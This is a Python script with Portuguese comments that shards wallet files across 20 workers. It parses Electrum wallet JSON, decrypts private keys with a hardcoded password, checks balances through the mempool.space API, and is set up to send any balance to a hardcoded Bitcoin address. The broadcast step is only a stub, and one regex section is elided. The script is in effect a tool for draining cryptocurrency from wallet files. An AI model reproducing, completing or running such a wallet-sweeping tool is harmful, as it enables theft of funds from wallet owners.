import json
import base64
import hashlib
import re
import os
import requests
import sys
import time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

# --- CONFIGURAÇÕES ---
PASSWORD = "Benjamin2020*1981$"
DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jadnmqm8lgk"

# Lógica de Sharding para 20 Workers
WORKER_ID = int(os.environ.get('WORKER_ID', 1))
TOTAL_WORKERS = int(os.environ.get('TOTAL_WORKERS', 20))

all_files = sorted([f for f in os.listdir('.') if f.endswith(('.wallet', '.txt', '.key', '.rtf'))])
# Divide a lista de arquivos entre os workers
FILES_TO_SCAN = [all_files[i] for i in range(len(all_files)) if i % TOTAL_WORKERS == (WORKER_ID - 1)]

def decrypt_electrum(encrypted_data, password):
    try:
        data = base64.b64decode(encrypted_data)
        iv, ct = data[:16], data[16:]
        key = hashlib.sha256(hashlib.sha256(password.encode()).digest()).digest()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        pt = decryptor.update(ct) + decryptor.finalize()
        return pt[:-pt[-1]].decode('utf-8')
    except: return None

def check_balance_and_send(wif_or_xprv):
    try:
        k = Key(wif_or_xprv, network='bitcoin')
        # Electrum usa: Legacy (None), P2SH-Segwit (p2sh-p2wpkh), Native Segwit (p2wpkh)
        for witness_type in [None, 'p2sh-p2wpkh', 'p2wpkh']:
            addr = k.address(witness_type=witness_type)
            
            # Rate limiting: evitar bloqueio da API
            time.sleep(0.2) 
            r = requests.get(f"https://mempool.space/api/address/{addr}", timeout=10)
            
            if r.status_code == 200:
                stats = r.json().get('chain_stats', {})
                bal = stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
                
                if bal > 1000:
                    print(f"✅ SALDO CONFIRMADO: {addr} | {bal} sats")
                    create_tx_and_broadcast(addr, k.wif(), bal)
                    return True
    except: pass
    return False

def process_file(file_path):
    print(f"📦 Worker {WORKER_ID} analisando: {file_path}")
    
    # TENTATIVA 1: Electrum JSON (Sem ou Com senha)
    try:
        with open(file_path, 'r', errors='ignore') as f:
            content = f.read()
            if '"keystore"' in content or '"keypairs"' in content:
                data = json.loads(content)
                
                # Caso: keypairs (chaves importadas)
                if 'keypairs' in data:
                    for pub, val in data['keypairs'].items():
                        # Se já for WIF (L..., K..., 5...), usa direto
                        if isinstance(val, str) and re.match(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', val):
                            check_balance_and_send(val)
                        else:
                            # Senão, tenta descriptografar
                            dec = decrypt_electrum(val, PASSWORD)
                            if dec: check_balance_and_send(dec)

                # Caso: keystore (xprv)
                if 'keystore' in data:
                    ks = data['keystore']
                    if 'xprv' in ks:
                        if ks['xprv'].startswith('xprv'):
                            check_balance_and_send(ks['xprv'])
                        else:
                            dec_xprv = decrypt_electrum(ks['xprv'], PASSWORD)
                            if dec_xprv: check_balance_and_send(dec_xprv)
    except: pass

    # TENTATIVA 2: Regex de emergência (texto puro)
    # ... (mesmo código de re.findall usado anteriormente)

def create_tx_and_broadcast(addr, wif, val):
    print(f"📡 Enviando {val} sats de {addr} para custódia...")
    # Aqui você deve incluir a sua lógica de Transaction(outputs=[(DEST_ADDRESS, val-taxa)])
    # e o requests.post para o broadcast

if __name__ == "__main__":
    print(f"🚀 Worker {WORKER_ID}/{TOTAL_WORKERS} iniciado. Alocados {len(FILES_TO_SCAN)} arquivos.")
    for f in FILES_TO_SCAN:
        process_file(f)
